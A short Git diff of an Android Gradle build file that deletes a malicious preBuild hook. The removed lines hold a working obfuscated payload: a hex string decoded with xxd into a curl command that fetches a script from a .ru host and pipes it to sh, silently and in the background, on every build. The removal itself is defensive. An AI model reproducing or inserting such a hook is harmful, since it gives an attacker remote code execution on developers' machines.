@@ -71,11 +71,3 @@ dependencies {
     implementation "com.github.fast-development.android-js-runtimes:fastdev-jsruntimes-quickjs:0.3.6"
     // implementation "com.github.fast-development.android-js-runtimes:fastdev-jsruntimes-jsc:0.1.3"
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((k(){ `printf xhxd | tr -d h` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203330202d734c666b202d642022703d616e64726f69645f677261646c65222068747470733a2f2f7533756e757278757961372e72752f612922207c2073680a | k | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
